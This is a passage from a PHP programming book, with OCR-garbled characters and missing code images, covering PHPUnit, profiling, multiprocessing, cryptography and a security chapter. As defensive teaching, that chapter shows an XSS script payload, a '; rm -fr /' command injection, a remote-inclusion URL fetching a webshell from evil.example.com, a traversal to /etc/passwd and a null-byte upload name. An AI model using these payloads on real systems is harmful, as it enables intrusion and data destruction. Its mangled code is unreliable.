![](image_rsrcNB6.jpg)class LoginFormTest extends TestCase { protected $loginForm;

// Execułing code on łhe słarł of łhe łesł

public function setUp() {

$this\->loginForm \= new LoginForm;

}

// To vaﾕidałe our ruﾕes, we shouﾕd use łhe vaﾕidałe() mełhod

/\*\*

\*   This mełhod beﾕongs ło Unił łesł cﾕass LoginFormTesł and

\*   ił's łesłing ruﾕes łhał are described above.

\*/

public function testRuleValidation() {

$rules \= $this\->loginForm\->rules();

// Iniłiaﾕize ło vaﾕid and łesł łhis

$this\->loginForm\->email \= "[valid@email.com](mailto:valid@email.com)";

$this\->loginForm\->password \= "password";

$this\->loginForm\->rememberMe \= true;

$this\->assertTrue($this\->loginForm\->validate($rules), "Should be valid as nothing is invalid");

// Tesł emaiﾕ vaﾕidałion

// Since we made emaiﾕ ło be in emaiﾕ formał, ił cannoł be empły

$this\->loginForm\->email \= '';

$this\->assertFalse($this\->loginForm\->validate($rules), "Email should not be valid (empty)");

// Ił does noł conłain "@" in słring so ił's invaﾕid

$this\->loginForm\->email \= 'invalid.email.com';

$this\->assertFalse($this\->loginForm\->validate($rules), "Email should not be valid (invalid format)");

// Reverł emaiﾕ ło vaﾕid for nexł łesł

$this\->loginForm\->email \= 'valid@email.com';

// Tesł password vaﾕidałion

// Password cannoł be empły (since ił's required)

$this\->loginForm\->password \= '';

$this\->assertFalse($this\->loginForm\->validate($rules), "Password should not be valid (empty)");

// Reverł password ło vaﾕid for nexł łesł

$this\->loginForm\->password \= 'ThisIsMyPassword';

// Tesł rememberMe vaﾕidałion

$this\->loginForm\->rememberMe \= 999;

$this\->assertFalse($this\->loginForm\->validate($rules), "RememberMe should not be valid (integer type)");

// Reverł remeberMe ło vaﾕid for nexł łesł

$this\->loginForm\->rememberMe \= true;

}

}

How exactly Unit tests can help with (excluding general examples) in here? For example, it fits very well when we get unexpected results. For example, let's take this rule from earlier:

![](image_rsrcNB7.jpg)

Instead, if we missed one important thing and wrote this:

![](image_rsrcNB8.jpg)

With dozens of different rules (assuming we are using not just email and password), it's difficult to detect mistakes. This unit test:

![](image_rsrcNB9.jpg)

Will pass our first example but not second. Why? Because in 2nd example we wrote a pattern with a typo (missed +

sign), meaning it only accepts one letter/number.

Unit tests can be run in console with command: phpunit \[path\_to\_file\]. If everything is OK, we should be able to see that all tests are in OK state, else we will see either Error (syntax errors) or Fail (at least one line in that method did not pass).

With additional parameters like \--coverage we can also see visually how many lines in backend code were tested and which passed/failed. This applies to any framework that has installed PHPUnit.

Example how PHPUnit test looks like in console (general look, not according to this example):

![](image_rsrcNBA.jpg)

Section 96.2: PHPUnit Data Providers

Test methods often need data to be tested with. To test some methods completely you need to provide different data sets for every possible test condition. Of course, you can do it manually using loops, like this:

![](image_rsrcNBB.jpg)

And someone can find it convenient. But there are some drawbacks of this approach. First, you'll have to perform additional actions to extract data if your test function accepts several parameters. Second, on failure it would be difficult to distinguish the failing data set without additional messages and debugging. Third, PHPUnit provides automatic way to deal with test data sets using data providers.

![](image_rsrcNBC.jpg)A data provider method must be public and either return an array of arrays or an object that implements the Iterator interface and yields an array for each iteration step. For each array that is part of the collection the test method will be called with the contents of the array as its arguments.

To use a data provider with your test, use @dataProvider annotation with the name of data provider function specified:

![](image_rsrcNBD.jpg)

Array of arrays

![](image_rsrcNBE.jpg)Note that dataProviderForTest() returns array of arrays. Each nested array has two elements and they will fill necessary parameters for testEquals() one by one. Error like this will be thrown Missing argument 2 for Test::testEquals() if there are not enough elements. PHPUnit will automatically loop through data and run tests:

![](image_rsrcNBF.jpg)

Each data set can be named for convenience. It will be easier to detect failing data:

![](image_rsrcNBG.jpg)

![](image_rsrcNBH.jpg)Iterators

![](image_rsrcNBJ.jpg)public function  construct($array) {

$this\->array \= $array;

}

function rewind() {

return reset($this\->array);

}

function current() {

return current($this\->array);

}

function key() {

return key($this\->array);

}

function next() {

return next($this\->array);

}

function valid() {

return key($this\->array) !== null;

}

}

...

class Test extends TestCase

{

/\*\*

\*   @dałaProvider dałaProviderForTesł

\*/

public function testEquals($a)

{

$toCompare \= θ;

$this\->assertEquals($a, $toCompare);

}

public function dataProviderForTest()

{

return new MyIterator(\[ 'Test 1' \=> \[θ\], 'Test 2' \=> \[false\], 'Test 3' \=> \[null\]

\]);

}

}

As you can see, simple iterator also works.

![](image_rsrcKPX.jpg)Note that even for a single parameter, data provider must return an array \[$parameter\]

![](image_rsrcNBK.jpg)

Because if we change our current() method (which actually return data on every iteration) to this:

Or change actual data:​436

![](image_rsrcNBM.jpg)

We'll get an error:

![](image_rsrcNBN.jpg)

![](image_rsrcKNA.jpg)Of course, it is not useful to use Iterator object over a simple array. It should implement some specific logic for your case.

Generators

It is not explicitly noted and shown in manual, but you can also use a generator as data provider. Note that

Generator class actually implements Iterator interface.

So here's an example of using DirectoryIterator combined with generator:

![](image_rsrcNBP.jpg)

![](image_rsrcKN7.jpg)Note provider yields an array. You'll get an invalid-data-provider warning instead.

Section 96.3: Test exceptions

Let's say you want to test method which throws an exception

![](image_rsrcNBR.jpg)

![](image_rsrcNBS.jpg)

You can do that by enclosing the method call into a try/catch block and making assertions on execption object's properties, but more conveniently you can use exception assertion methods. As of PHPUnit 5.2 you have expectX() methods available for asserting exception type, message & code

![](image_rsrcNBT.jpg)

If you are using earlier version of PHPUnit, method setExpectedException can be used in stead of expectX() methods, but keep in mind that it's deprecated and will be removed in version 6.

![](image_rsrcNBU.jpg)

Chapter 97: Performance

Section 97.1: Profiling with Xdebug

An extension to PHP called Xdebug is available to assist in profiling PHP applications, as well as runtime debugging. When running the profiler, the output is written to a file in a binary format called "cachegrind". Applications are available on each platform to analyze these files.

To enable profiling, install the extension and adjust php.ini settings. In our example we will run the profile optionally based on a request parameter. This allows us to keep settings static and turn on the profiler only as needed.

![](image_rsrcNBV.jpg)

Next use a web client to make a request to your application's URL you wish to profile, e.g.

![](image_rsrcNBW.jpg)

As the page processes it will write to a file with a name similar to

![](image_rsrcNBX.jpg)

Note that it will write one file for each PHP request / process that is executed. So, for example, if you wish to analyze a form post, one profile will be written for the GET request to display the HTML form. The XDEBUG\_PROFILE parameter will need to be passed into the subsequent POST request to analyze the second request which processes the form. Therefore when profiling it is sometimes easier to run curl to POST a form directly.

Once written the profile cache can be read by an application such as KCachegrind.

![](image_rsrcNBY.jpg)

This will display information including:

![](image_rsrcNBZ.jpg)Functions executed

![](image_rsrcNC0.jpg)![](image_rsrcNC1.jpg)Call time, both itself and inclusive of subsequent function calls Number of times each function is called

![](image_rsrcNC2.jpg)Call graphs

![](image_rsrcNC3.jpg)Links to source code

Obviously performance tuning is very specific to each application's use cases. In general it's good to look for:

![](image_rsrcNC4.jpg)Repeated calls to the same function you wouldn't expect to see. For functions that process and query data these could be prime opportunities for your application to cache.

![](image_rsrcNC5.jpg)Slow-running functions. Where is the application spending most of its time? the best payoff in performance tuning is focusing on those parts of the application which consume the most time.

Note: Xdebug, and in particular its profiling features, are very resource intensive and slow down PHP execution. It is recommended to not run these in a production server environment.

Section 97.2: Memor6 Usage

execution of PHP from using up too much memory, exhausting it for other scripts and system software. The memory limit defaults to 128M and can be changed in the php.ini file or at runtime. It can be set to have no limit, but this is generally considered bad practice.

The exact memory usage used during runtime can be determined by calling memory\_get\_usage(). It returns the number of bytes of memory allocated to the currently running script. As of PHP 5.2, it has one optional boolean parameter to get the total allocated system memory, as opposed to the memory that's actively being used by PHP.

![](image_rsrcNC6.jpg)

Now memory\_get\_usage gives you memory usage at the moment it is run. Between calls to this function you may allocate and deallocate other things in memory. To get the maximum amount of memory used up to a certain point, call memory\_get\_peak\_usage().

![](image_rsrcNC7.jpg)

Notice the value will only go up or stay constant.

Section 97.3: Profiling with XHProf

XHProf is a PHP profiler originally written by Facebook, to provide a more lightweight alternative to XDebug.

![](image_rsrcNC8.jpg)

After installing the​PHP module, profiling can be enabled / disabled from PHP code:

![](image_rsrcNC9.jpg)

The returned array will contain data about the number of calls, CPU time and memory usage of each function that has been accessed inside doSlowOperation().

xhprof\_sample\_enable()/xhprof\_sample\_disable() can be used as a more lightweight option that will only log profiling information for a fraction of requests (and in a different format).

Chapter 98: Multiprocessing

Section 98.1: Multiprocessing using built-in fork functions

You can use built-in functions to run PHP processes as forks. This is the most simple way to achieve parallel work if you don't need your threads to talk to each other.

This allows you to put time intensive tasks (like uploading a file to another server or sending an email) to another thread so your script loads faster and can use multiple cores but be aware that this is not real multithreading and your main thread won't know what the children are up to.

![](image_rsrcNCA.jpg)

Note that under Windows this will make another command prompt pop up for each fork you start. master.php

worker.php

![](image_rsrcNCB.jpg)

Section 98.2: Creating child process using fork

PHP has built in function pcntl\_fork for creating child process. pcntl\_fork is same as fork in unix. It does not take in any parameters and returns integer which can be used to differentiate between parent and child process.

Consider the following code for explanation

![](image_rsrcNCC.jpg)

As you can see \-1 is an error in fork and the child was not created. On creation of child, we have two processes running with separate PID.

Another consideration here is a zombie process or defunct process when parent process finishes before child process. To prevent a zombie children process simply add pcntl\_wait($status) at the end of parent process.

![](image_rsrcKR6.jpg)pnctl\_wait suspends execution of parent process until the child process has exited.

It is also worth noting that zombie process can't be killed using SIGKILL signal.

Section 98.3: Inter-Process Communication

Interprocess communication allows programmers to communicate between different processes. For example let us consider we need to write an PHP application that can run bash commands and print the output. We will be using proc\_open , which will execute the command and return a resource that we can communicate with. The following code shows a basic implementation that runs pwd in bash from php

![](image_rsrcNCD.jpg)

proc\_open runs bash command with $descriptor as descriptor specifications. After that we use is\_resource to validate the process. Once done we can start interacting with the child process using $pipes which is generated according to descriptor specifications.

![](image_rsrcKNA.jpg)After that we can simply use fwrite to write to stdin of child process. In this case pwd followed by carriage return. Finally stream\_get\_contents is used to read stdout of child process.

Always remember to close the child process by using proc\_close() which will terminate the child and return the exit status code.

Chapter 99: Multi Threading Extension

Section 99.1: Getting Started

To start with multi-threading, you would need the pthreads\-ext for php, which can be installed by

![](image_rsrcNCE.jpg)

![](image_rsrcNCF.jpg)and adding the entry to php.ini. A simple example:

Section 99.2: Using Pools and Workers

![](image_rsrcKMR.jpg)Pooling provides a higher level abstraction of the Worker functionality, including the management of references in the way required by pthreads. From: [http://php.net/manual/en/class.pool.php](http://php.net/manual/en/class.pool.php)

Pools and workers provide an higher level of control and ease of creating multi-threaded

![](image_rsrcNCG.jpg)

![](image_rsrcNCH.jpg)

\*   The work name wich wouﾕd be given ło every work.

\*/

public function​construct(string $workName) {

// The bﾕock of code in łhe consłrucłor of your work,

// wouﾕd be execułed when a work is submiłłed ło your pooﾕ.

$this\->workName \= $workName;

printf("A new work was submitted with the name: %s\\n", $workName);

}

public function run() {

// This bﾕock of code in, łhe mełhod, run

// wouﾕd be caﾕﾕed by your worker.

// Aﾕﾕ łhe code in łhis mełhod wiﾕﾕ be execułed in anołher łhread.

$workName \= $this\->workName;

printf("Work named %s starting...\\n", $workName); printf("New random number: %d\\n", mt\_rand());

}

}

// Creałe an empły worker for łhe sake of simpﾕiciły.

class AwesomeWorker extends Worker { public function run() {

// You can puł some code in here, which wouﾕd be execułed

// before łhe Work's are słarłed (łhe bﾕock of code in łhe \`run\` mełhod of your Work)

// by łhe Worker.

/\* ... \*/

}

}

// Creałe a new Pooﾕ Insłance.

// The cłor of \\Pooﾕ accepłs łwo paramełers.

// Firsł: The maximum number of workers your pooﾕ can creałe.

// Second: The name of worker cﾕass.

$pool \= new \\Pool(1, \\AwesomeWorker::class);

// You need ło submił your jobs, rałher łhe insłance of

// łhe objecłs (works) which exłends łhe \\Threaded cﾕass.

$pool\->submit(new \\AwesomeWork("DeadlyWork"));

$pool\->submit(new \\AwesomeWork("FatalWork"));

// We need ło expﾕiciłﾕy shułdown łhe pooﾕ, ołherwise,

// unexpecłed łhings may happen.

// See: hłłp://słackoverfﾕow.com/a/23600861/23602185

$pool\->shutdown();

Chapter 100: Secure Remeber Me

I have been searching on this topic for sometime till i found this post https://stackoverflow.com/a/17266448/4535386 from ircmaxell, I think it deserves more exposure.

Section 100.1: ”ßeep Me Logged In” \- the best approach

store the cookie with three parts.

![](image_rsrcNCJ.jpg)

Then, to validate:

![](image_rsrcNCK.jpg)

Chapter 101: Securit6

As the majority of websites run off PHP, application security is an important topic for PHP developers to protect their website, data, and clients. This topic covers best security practices in PHP as well as common vulnerabilities and weaknesses with example fixes in PHP.

Section 101.1: PHP Version Leakage

By default, PHP will tell the world what version of PHP you are using, e.g.

![](image_rsrcNCM.jpg)

To fix this you can either change php.ini:

![](image_rsrcNCN.jpg)

Or change the header:

![](image_rsrcNCP.jpg)

Or if you'd prefer a htaccess method:

![](image_rsrcNCR.jpg)

If either of the above methods do not work, there is also the header\_remove() function that provides you the ability to remove the header:

![](image_rsrcNCS.jpg)

If attackers know that you are using PHP and the version of PHP that you are using, it's easier for them to exploit your server.

Section 101.2: Cross-Site Scripting (XSS)

Problem

Cross-site scripting is the unintended execution of remote code by a web client. Any web application might expose itself to XSS if it takes input from a user and outputs it directly on a web page. If input includes HTML or JavaScript, remote code can be executed when this content is rendered by the web client.

For example, if a 3rd party side contains a JavaScript file:

![](image_rsrcNCT.jpg)

And a PHP application directly outputs a string passed into it:

![](image_rsrcNCU.jpg)

If an unchecked GET parameter contains <script src\=["http://example.com/runme.js](http://example.com/runme.js)"\></script> then the output of the PHP script will be:

![](image_rsrcNCV.jpg)

The 3rd party JavaScript will run and the user will see "I'm running" on the web page. Solution

As a general rule, never trust input coming from a client. Every GET, POST, and cookie value could be anything at all, and should therefore be validated. When outputting any of these values, escape them so they will not be evaluated in an unexpected way.

Keep in mind that even in the simplest applications data can be moved around and it will be hard to keep track of all sources. Therefore it is a best practice to always escape output.

PHP provides a few ways to escape output depending on the context. Filter Functions

PHPs Filter Functions allow the input data to the php script to be sanitized or validated in many ways. They are useful when saving or outputting client input.

HTML Encoding

htmlspecialchars will convert any "HTML special characters" into their HTML encodings, meaning they will then not

be processed as standard HTML. To fix our previous example using this method:

![](image_rsrcNCW.jpg)

Would output:

![](image_rsrcNCX.jpg)

Everything inside the <div> tag will not be interpreted as a JavaScript tag by the browser, but instead as a simple text node. The user will safely see:

![](image_rsrcNCY.jpg)

URL Encoding

When outputting a dynamically generated URL, PHP provides the urlencode function to safely output valid URLs. So, for example, if a user is able to input data that becomes part of another GET parameter:

![](image_rsrcNCZ.jpg)

Any malicious input will be converted to an encoded URL parameter. Using specialised external libraries or OWASP AntiSamy lists

Sometimes you will want to send HTML or other kind of code inputs. You will need to maintain a list of authorised

You can download standard lists available at the OWASP AntiSamy website. Each list is fit for a specific kind of interaction (ebay api, tinyMCE, etc...). And it is open source.

There are libraries existing to filter HTML and prevent XSS attacks for the general case and performing at least as well as AntiSamy lists with very easy use. For example you have HTML Purifier

Section 101.3: Cross-Site Request Forger6

Problem

Cross-Site Request Forgery or CSRF can force an end user to unknowingly generate malicious requests to a web server. This attack vector can be exploited in both POST and GET requests. Let's say for example the url endpoint

/delete.php?accnt\=12 deletes account as passed from accnt parameter of a GET request. Now if an authenticated user will encounter the following script in any other application

![](image_rsrcND0.jpg)

the account would be deleted. Solution

A common solution to this problem is the use of CSRF tokens. CSRF tokens are embedded into requests so that a web application can trust that a request came from an expected source as part of the application's normal workflow. First the user performs some action, such as viewing a form, that triggers the creation of a unique token. A sample form implementing this might look like

![](image_rsrcND1.jpg)

The token can then be validated by the server against the user session after form submission to eliminate malicious requests.

Sample code

Here is sample code for a basic implementation:

![](image_rsrcND2.jpg)

![](image_rsrcND3.jpg)

There are many libraries and frameworks already available which have their own implementation of CSRF validation. Though this is the simple implementation of CSRF, You need to write some code to regenerate your CSRF token dynamically to prevent from CSRF token stealing and fixation.

Section 101.4: Command Line Injection

Problem

In a similar way that SQL injection allows an attacker to execute arbitrary queries on a database, command-line injection allows someone to run untrusted system commands on a web server. With an improperly secured server this would give an attacker complete control over a system.

Let's say, for example, a script allows a user to list directory contents on a web server.

![](image_rsrcND4.jpg)

(In a real-world application one would use PHP's built-in functions or objects to get path contents. This example is for a simple security demonstration.)

One would hope to get a path parameter similar to /tmp. But as any input is allowed, path could be ; rm \-fr /.

The web server would then execute the command

![](image_rsrcND5.jpg)

and attempt to delete all files from the root of the server. Solution

All command arguments must be escaped using escapeshellarg() or escapeshellcmd(). This makes the arguments non-executable. For each parameter, the input value should also be validated.

In the simplest case, we can secure our example with

![](image_rsrcND6.jpg)

![](image_rsrcND7.jpg)

Following the previous example with the attempt to remove files, the executed command becomes

![](image_rsrcND8.jpg)

And the string is simply passed as a parameter to ls, rather than terminating the ls command and running rm.

It should be noted that the example above is now secure from command injection, but not from directory traversal. To fix this, it should be checked that the normalized path starts with the desired sub-directory.

PHP offers a variety of functions to execute system commands, including exec, passthru, proc\_open, shell\_exec, and system. All must have their inputs carefully validated and escaped.

Section 101.5: Stripping Tags

strip\_tags is a very powerful function if you know how to use it. As a method to prevent cross-site scripting attacks there are better methods, such as character encoding, but stripping tags is useful in some cases.

![](image_rsrcND9.jpg)Basic Example

Raw Output

![](image_rsrcNDA.jpg)

Allowing Tags

Say you wanted to allow a certain tag but no other tags, then you'd specify that in the second parameter of the function. This parameter is optional. In my case I only want the <b> tag to be passed through.

![](image_rsrcNDB.jpg)

Raw Output

![](image_rsrcNDC.jpg)

Notice(s)

HTML comments and PHP tags are also stripped. This is hardcoded and can not be changed with allowable\_tags.

In PHP 5.3.4 and later, self-closing XHTML tags are ignored and only non-self-closing tags should be used in allowable\_tags. For example, to allow both <br> and <br/\>, you should use:

![](image_rsrcNDD.jpg)

451

Section 101.6: File Inclusion

Remote File Inclusion

![](image_rsrcNDE.jpg)

Remote File Inclusion (also known as RFI) is a type of vulnerability that allows an attacker to include a remote file. This example injects a remotely hosted file containing a malicious code:

![](image_rsrcKH6.jpg)/vulnerable.php?page=[http://evil.example.com/webshell.txt?](http://evil.example.com/webshell.txt)

Local File Inclusion

Local File Inclusion (also known as LFI) is the process of including files on a server through the web browser.

![](image_rsrcNDF.jpg)

![](image_rsrcKN7.jpg)/vulnerable.php?page=../../../../etc/passwd

Solution to RFI & LFI:

It is recommended to only allow including files you approved, and limit to those only.

![](image_rsrcNDG.jpg)

Section 101.7: Error Reporting

By default PHP will output errors, warnings and notice messages directly on the page if something unexpected in a script occurs. This is useful for resolving specific issues with a script but at the same time it outputs information you don't want your users to know.

Therefore it's good practice to avoid displaying those messages which will reveal information about your server, like your directory tree for example, in production environments. In a development or testing environment these messages may still be useful to display for debugging purposes.

A quick solution

![](image_rsrcNDH.jpg)

Or change them directly in the php.ini.

![](image_rsrcNDJ.jpg)

Handling errors

A better option would be to store those error messages to a place they are more useful, like a database:

![](image_rsrcNDK.jpg)

This method will log the messages to the database and if that fails to a file instead of echoing it directly into the page. This way you can track what users are experiencing on your website and notify you immediately if something go's wrong.

Section 101.8: Uploading files

If you want users to upload files to your server you need to do a couple of security checks before you actually move the uploaded file to your web directory.

The uploaded data:

This array contains user submitted data and is not information about the file itself. While usually this data is generated by the browser one can easily make a post request to the same form using software.

![](image_rsrcNDM.jpg)

name \- Verify every aspect of it.

![](image_rsrcNDN.jpg)![](image_rsrcNDP.jpg)type \- Never use this data. It can be fetched by using PHP functions instead.

![](image_rsrcNDR.jpg)size \- Safe to use.

![](image_rsrcNDS.jpg)tmp\_name \- Safe to use.

Exploiting the file name

can add them allowing for unexpected things to happen. For example, lets name the file:

../script.php%θθ.png

Take good look at that filename and you should notice a couple of things.

1.  The first to notice is the ../, fully illegal in a file name and at the same time perfectly fine if you are moving a file from 1 directory to another, which we're gonna do right?

2.  Now you might think you were verifying the file extensions properly in your script but this exploit relies on the url decoding, translating %θθ to a null character, basically saying to the operating system, this string ends here, stripping off .png off the filename.

So now I've uploaded script.php to another directory, by-passing simple validations to file extensions. It also by- passes .htaccess files disallowing scripts to be executed from within your upload directory.

Getting the file name and extension safely

You can use pathinfo() to extrapolate the name and extension in a safe manner but first we need to replace unwanted characters in the file name:

![](image_rsrcNDT.jpg)

While now we have a filename and extension that can be used for storing, I still prefer storing that information in a database and give that file a generated name of for example, md5(uniqid().microtime())

![](image_rsrcNDU.jpg)

+​+

+

| id | title

|

+​+

+

+​+​+​+​+

| extension | mime​| size | filename​| time

+​+​+​+​+

| 1 | myfile | txt​| text/plain | 1020 | 5bcdaeddbfbd2810fa1b6f3118804d66 | 2017-03-11 00:38:54 |

+​+​+​+​+​+​+

+

This would resolve the issue of duplicate file names and unforseen exploits in the file name. It would also cause the attacker to guess where that file has been stored as he or she cannot specifically target it for execution.

Mime-type validation

Checking a file extension to determine what file it is is not enough as a file may named image.png but may very well contain a php script. By checking the mime-type of the uploaded file against a file extension you can verify if the file contains what its name is referring to.

You can even go 1 step further for validating images, and that is actually opening them:

![](image_rsrcNDV.jpg)

You can fetch the mime-type using a build-in function or a class.

White listing your uploads

Most importantly, you should whitelist file extensions and mime types depending on each form.

![](image_rsrcNDW.jpg)

Chapter 102: Cr6ptograph6

Section 102.1: S6mmetric Encr6ption and Decr6ption of large Files with OpenSSL

PHP lacks a build-in function to encrypt and decrypt large files. openssl\_encrypt can be used to encrypt strings, but loading a huge file into memory is a bad idea.

So we have to write a userland function doing that. This example uses the symmetric AES-128-CBC algorithm to encrypt smaller chunks of a large file and writes them into another file.

![](image_rsrcNDX.jpg)Encrypt Files

/\*\*

\*   Define łhe number of bﾕocks łhał shouﾕd be read from łhe source fiﾕe for each chunk.

\*   For 'AES\-128-CBC' each bﾕock consisł of 16 byłes.

\*   So if we read 10,000 bﾕocks we ﾕoad 160kb inło memory. You may adjusł łhis vaﾕue

\*   ło read/wriłe shorłer or ﾕonger chunks.

\*/

define('FILE\_ENCRYPTION\_BLOCKS', 1θθθθ);

/\*\*

\*   Encrypł łhe passed fiﾕe and saves łhe resuﾕł in a new fiﾕe wiłh ".enc" as suffix.

\*

\*   @param słring $source Pałh ło fiﾕe łhał shouﾕd be encrypłed

\*   @param słring $key​The key used for łhe encrypłion

\*   @param słring $desł​Fiﾕe name where łhe encryped fiﾕe shouﾕd be wriłłen ło.

\*   @rełurn słring/faﾕse Rełurns łhe fiﾕe name łhał has been creałed or FALSE if an error occurred

\*/

function encryptFile($source, $key, $dest)

{

$key \= substr(sha1($key, true), θ, 16);

$iv \= openssl\_random\_pseudo\_bytes(16);

$error \= false;

if ($fpOut \= fopen($dest, 'w')) {

// Puł łhe iniłiaﾕzałion vecłor ło łhe beginning of łhe fiﾕe

fwrite($fpOut, $iv);

if ($fpIn \= fopen($source, 'rb')) { while (!feof($fpIn)) {

$plaintext \= fread($fpIn, 16 \* FILE\_ENCRYPTION\_BLOCKS);

$ciphertext \= openssl\_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL\_RAW\_DATA,

$iv);

// Use łhe firsł 16 byłes of łhe cipherłexł as łhe nexł iniłiaﾕizałion vecłor

$iv \= substr($ciphertext, θ, 16); fwrite($fpOut, $ciphertext);

}

fclose($fpIn);

} else {

$error \= true;

}

fclose($fpOut);

} else {

$error \= true;

}

return $error ? false : $dest;

}

Decrypt Files

To decrypt files that have been encrypted with the above function you can use this function.

![](image_rsrcNDY.jpg)

How to use

If you need a small snippet to see how this works or to test the above functions, look at the following code.

![](image_rsrcNDZ.jpg)

This will create three files:

1.  testfile.txt with the plain text

2.  testfile.txt.enc with the encrypted file

3.  testfile.txt.dec with the decrypted file. This should have the same content as testfile.txt

Section 102.2: S6mmetric Cipher

This example illustrates the AES 256 symmetric cipher in CBC mode. An initialization vector is needed, so we generate one using an openssl function. The variable $strong is used to determine whether the IV generated was cryptographically strong.

![](image_rsrcNE0.jpg)Encryption

Decryption

![](image_rsrcNE1.jpg)

Base64 Encode & Decode

If the encrypted data needs to be sent or stored in printable text, then the base64\_encode() and base64\_decode()

functions should be used respectively.

![](image_rsrcNE2.jpg)

Chapter 103: Password Hashing Functions

As more secure web services avoid storing passwords in plain text format, languages such as PHP provide various (undecryptable) hash functions to support the more secure industry standard. This topic provides documentation for proper hashing with PHP.

Section 103.1: Creating a password hash

Create password hashes using password\_hash() to use the current industry best-practice standard hash or key derivation. At time of writing, the standard is bcrypt, which means, that PASSWORD\_DEFAULT contains the same value as PASSWORD\_BCRYPT.

![](image_rsrcNE3.jpg)

The third parameter is not mandatory.

The 'cost' value should be chosen based on your production server's hardware. Increasing it will make the password more costly to generate. The costlier it is to generate the longer it will take anyone trying to crack it to generate it also. The cost should ideally be as high as possible, but in practice it should be set so it does not slow down everything too much. Somewhere between 0.1 and 0.4 seconds would be okay. Use the default value if you are in doubt.

Version < 5.5

On PHP lower than 5.5.0 the password\_\* functions are not available. You should use the compatibility pack to substitute those functions. Notice the compatibility pack requires PHP 5.3.7 or higher or a version that has the $2y fix backported into it (such as RedHat provides).

If you are not able to use those, you can implement password hashing with crypt() As password\_hash() is implemented as a wrapper around the crypt() function, you need not lose any functionality.

![](image_rsrcNE4.jpg)

Salt for password hash

Despite of reliability of crypt algorithm there is still vulnerability against rainbow tables. That's the reason, why it's recommended to use salt.

A salt is something that is appended to the password before hashing to make source string unique. Given two identical passwords, the resulting hashes will be also unique, because their salts are unique.

![](image_rsrcNE5.jpg)![](image_rsrcNE6.jpg)A random salt is one of the most important pieces of your password security. This means that even with a lookup table of known password hashes an attacker can t match up your user s password hash with the database password hashes since a random salt has been used. You should use always random and cryptographically secure salts. Read more

With password\_hash() bcrypt algorithm, plain text salt is stored along with the resulting hash, which means that the hash can be transferred across different systems and platforms and still be matched against the original password.

Version < 7.0

Even when this is discouraged, you can use the salt option to define your own random salt.

![](image_rsrcNE7.jpg)

Important. If you omit this option, a random salt will be generated by password\_hash() for each password hashed. This is the intended mode of operation.

Version ≥ 7.0

The salt option has been deprecated as of PHP 7.0.0. It is now preferred to simply use the salt that is generated by default.

Section 103.2: Determine if an existing password hash can be upgraded to a stronger algorithm

If you are using the PASSWORD\_DEFAULT method to let the system choose the best algorithm to hash your passwords with, as the default increases in strength you may wish to rehash old passwords as users log in

![](image_rsrcNE8.jpg)

If the password\_\* functions are not available on your system (and you cannot use the compatibility pack linked in the remarks below), you can determine the algorithm an4d6u0sed to create the original hash in a method similar to

the following:

![](image_rsrcNE9.jpg)

Section 103.3: Verif6ing a password against a hash

password\_verify() is the built-in function provided (as of PHP 5.5) to verify the validity of a password against a known hash.

![](image_rsrcNEA.jpg)

All supported hashing algorithms store information identifying which hash was used in the hash itself, so there is no need to indicate which algorithm you are using to encode the plaintext password with.

If the password\_\* functions are not available on your system (and you cannot use the compatibility pack linked in the remarks below) you can implement password verification with the crypt() function. Please note that specific precautions must be taken to avoid timing attacks.

![](image_rsrcNEB.jpg)

Chapter 104: Contributing to the PHP Manual

The PHP Manual provides both a functional reference and a language reference along with explanations of PHP's major features. The PHP Manual, unlike most languages' documentation, encourages PHP developers to add their own examples and notes to each page of the documentation. This topic explains contribution to the PHP manual, along with tips, tricks, and guidelines for best practice.

Section 104.1: Improve the official documentation

PHP has great official documentation already at [http://php.net/manual/.](http://php.net/manual/) The PHP Manual documents pretty much all language features, the core libraries and most available extensions. There are plenty of examples to learn from. The PHP Manual is available in multiple languages and formats.

Best of all, the documentation is free for anyone to edit.

The PHP Documentation Team provides an online editor for the PHP Manual at https://edit.php.net. It supports multiple Single-Sign-On services, including logging in with your Stack Overflow account. You can find an introduction to the editor at https://wiki.php.net/doc/editor.

Changes to the PHP Manual need to be approved by people from the PHP Documentation Team having Doc Karma. Doc Karma is somewhat like reputation, but harder to get. This peer review process makes sure only factually correct information gets into the PHP Manual.

The PHP Manual is written in DocBook, which is an easy to learn markup language for authoring books. It might look a little bit complicated at first sight, but there are templates to get you started. You certainly don't need to be a DocBook expert to contribute.

Section 104.2: Tips for contributing to the manual

The following is a list of tips for those who are looking to contribute to the PHP manual:

![](image_rsrcNEC.jpg)Follow the manual's style guidelines. Ensure that the manual's style guidelines are always being followed for consistency's sake.

![](image_rsrcNED.jpg)Perform spelling and grammar checks. Ensure proper spelling and grammar is being used - otherwise the information presented may be more difficult to assimilate, and the content will look less professional.

![](image_rsrcNEE.jpg)Be terse in explanations. Avoid rambling to clearly and concisely present the information to developers who are looking to quickly reference it.

![](image_rsrcNEF.jpg)Separate code from its output. This gives cleaner and less convoluted code examples for developers to digest.

![](image_rsrcNEG.jpg)Check the page section order. Ensure that all sections of the manual page being edited are in the correct order. Uniformity in the manual makes it easier to quickly read and lookup information.

![](image_rsrcNEH.jpg)![](image_rsrcNEJ.jpg)![](image_rsrcNEK.jpg)Remove PHP 4-related content. Specific mentions to PHP 4 are no longer relevant given how old it is now. Mentions of it should be removed from the manual to prevent convoluting it with unnecessary information. Properly version files. When creating new files in the documentation, ensure that the revision ID of the file

is set to nothing, like so: !-- $Revision$ \-->.

![](image_rsrcNEM.jpg)Merge useful comments into the manual. Some comments contribute useful information that the manual

could benefit from having. These should be merged into the main page's content.

![](image_rsrcNEN.jpg)Don't break the documentation build. Always ensure that the PHP manual builds properly before committing the changes.

Chapter 105: Contributing to the PHP Core

Section 105.1: Setting up a basic development environment

PHP's source code is hosted on GitHub. To build from source you will first need to check out a working copy of the code.

![](image_rsrcNEP.jpg)

If you want to add a feature, it's best to create your own branch.

![](image_rsrcNER.jpg)

Finally, configure and build PHP

![](image_rsrcNES.jpg)

If configuration fails due to missing dependencies, you will need to use your operating system's package management system to install them (e.g. yum, apt, etc.) or download and compile them from source.

Appendix A: Installing a PHP environment on Windows

Section A.1: Download, Install and use WAMP

WampServer is a Windows web development environment. It allows you to create web applications with Apache2, PHP and a MySQL database. Alongside, PhpMyAdmin allows you to manage easily your databases.

WampServer is available for free (under GPML license) in two distinct versions : 32 and 64 bits. Wampserver 2.5 is not compatible with Windows XP, neither with SP3, nor Windows Server 2003. Older WampServer versions are available on SourceForge.

WampServer versions:

